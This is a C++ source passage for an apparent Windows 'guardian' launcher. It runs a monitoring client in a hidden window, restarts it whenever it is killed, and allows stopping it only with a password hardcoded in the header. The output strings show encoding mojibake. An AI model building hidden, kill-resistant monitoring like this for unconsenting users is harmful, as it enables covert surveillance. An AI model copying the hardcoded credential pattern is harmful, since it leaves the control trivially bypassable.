              cout << "\nðŸ” Password authentication required..." <<   endl;
            
            if (PasswordDialogWindows::showPasswordDialog()) {
                  cout << "âœ… Password correct - Stopping monitoring..." <<   endl;
                exit_authorized = true;
                monitoring = false;
                break;
            } else {
                  cout << "âŒ INCORRECT PASSWORD!" <<   endl;
                  cout << "   Monitoring continues...\n" <<   endl;
            }
        } else if (input == "status") {
            if (clientProcess.hProcess) {
                DWORD exitCode;
                GetExitCodeProcess(clientProcess.hProcess, &exitCode);
                if (exitCode == STILL_ACTIVE) {
                      cout << "âœ… Client is running (PID: " << clientProcess.dwProcessId << ")" <<   endl;
                      cout << "ðŸ”’ Background monitoring: ACTIVE" <<   endl;
                } else {
                      cout << "âš ï¸  Client is not running" <<   endl;
                }
            }
        } else if (input == "show") {
              cout << "â„¹ï¸  Client runs in background - no console to show" <<   endl;
        } else if (!input.empty()) {
              cout << "Unknown command. Type 'exit', 'status', or 'show'." <<   endl;
        }
    }
}

void monitorClient(const   string& server_ip, const   string& port, 
                   const   string& client_id) {
    int restartCount = 0;
    const int MAX_RESTARTS = 100;  // High number = keep trying
    
      string client_exe = "client.exe";
      string client_args = server_ip + " " + port + " " + client_id + " --guardian";
    
    while (monitoring && !exit_authorized) {
        DWORD waitResult = WaitForSingleObject(clientProcess.hProcess, 2000);
        
        if (waitResult == WAIT_OBJECT_0) {
            // Process exited
            DWORD exitCode;
            GetExitCodeProcess(clientProcess.hProcess, &exitCode);
            
            CloseHandle(clientProcess.hProcess);
            CloseHandle(clientProcess.hThread);
            ZeroMemory(&clientProcess, sizeof(clientProcess));
            
            if (!exit_authorized) {
                  cout << "\nâš ï¸  CLIENT TERMINATED! (Exit code: " << exitCode << ")" <<   endl;
                
                if (restartCount < MAX_RESTARTS) {
                      cout << "ðŸ”„ Restarting in 3 seconds... (attempt " 
                              << (restartCount + 1) << "/" << MAX_RESTARTS << ")" <<   endl;
                    
                      this_thread::sleep_for(  chrono::seconds(3));
                    
                    if (launchClientHidden(client_exe, client_args)) {
                          cout << "âœ… Client restarted (PID: " << clientProcess.dwProcessId << ")" <<   endl;
                        restartCount++;
                    } else {
                          cout << "âŒ Failed to restart client" <<   endl;
                          this_thread::sleep_for(  chrono::seconds(5));
                    }
                } else {
                      cout << "âŒ Maximum restart attempts reached" <<   endl;
                    monitoring = false;
                    break;
                }
            } else {
                  cout << "âœ… Authorized exit" <<   endl;
                break;
            }
        }
    }
    
    // Final cleanup
    if (clientProcess.hProcess) {
          cout << "ðŸ›‘ Terminating client..." <<   endl;
        TerminateProcess(clientProcess.hProcess, 0);
        WaitForSingleObject(clientProcess.hProcess, 2000);
        CloseHandle(clientProcess.hProcess);
        CloseHandle(clientProcess.hThread);
    }
}

int main(int argc, char* argv[]) {
    SetConsoleOutputCP(CP_UTF8);
    
    if (argc != 4) {
          cout << "Usage: launcher.exe <server_ip> <port> <client_id>" <<   endl;
          cout << "Example: launcher.exe 192.168.100.8 8080 bscs24009" <<   endl;
        return 1;
    }
    
      string server_ip = argv[1];
      string port = argv[2];
      string client_id = argv[3];
    
      cout << "\nðŸ›¡ï¸  PROTECTED CLIENT LAUNCHER (Background Mode)" <<   endl;
      cout << "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n" <<   endl;
      cout << "Server: " << server_ip << ":" << port <<   endl;
      cout << "Client ID: " << client_id <<   endl;
    
      string client_exe = "client.exe";
      string client_args = server_ip + " " + port + " " + client_id + " --guardian";
    
      cout << "\nâ³ Launching client in background..." <<   endl;
    
    if (!launchClientHidden(client_exe, client_args)) {
          cerr << "âŒ Failed to launch client!" <<   endl;
          cout << "Press any key to exit...";
        _getch();
        return 1;
    }
    
      cout << "âœ… Client launched (PID: " << clientProcess.dwProcessId << ")" <<   endl;
      cout << "âœ… Running in background (hidden console)" <<   endl;
    
      cout << "\nðŸ”’ PROTECTION ACTIVE:" <<   endl;
      cout << "   âœ“ Client runs in background (no visible window)" <<   endl;
      cout << "   âœ“ Auto-restarts on crash (up to 100 times)" <<   endl;
      cout << "   âœ“ Password required to stop: 'exit' command" <<   endl;
      cout << "   âœ“ Alternative: Run guardian_exit.exe" <<   endl;
    
    // Start input handler
      thread inputHandler(inputThread);
    
    // Monitor the client
    monitorClient(server_ip, port, client_id);
    
    // Cleanup
    monitoring = false;
    if (inputHandler.joinable()) {
        inputHandler.join();
    }
    
      cout << "\nâœ… Guardian shutdown complete" <<   endl;
    return 0;
}

#endif // PLATFORM_WINDOWS

===== FILE: ./launcher_common.hpp =====

#ifndef LAUNCHER_COMMON_HPP
#define LAUNCHER_COMMON_HPP

#include <string>
#include <atomic>
#include <iostream>
#include <fstream>
using namespace std; 
// Hardcoded password - CHANGE THIS before distributing!
// For production, read from encrypted config or environment variable
const   string GUARDIAN_PASSWORD = "abd101";

class LauncherConfig {
public:
      string client_executable;
      string server_ip;
    int server_port;
      string client_id;
      atomic<bool> exit_authorized{false};
    
    LauncherConfig(const   string& exe, const   string& ip, 
                   int port, const   string& id)
        : client_executable(exe), server_ip(ip), 
          server_port(port), client_id(id) {}
};

inline bool verifyPassword(const   string& input) {
    return input == GUARDIAN_PASSWORD;
}

inline void showUnauthorizedMessage() {
      cout << "\nâŒ UNAUTHORIZED EXIT ATTEMPT DENIED!" <<   endl;
      cout << "The monitoring session continues..." <<   endl;
}

#endif




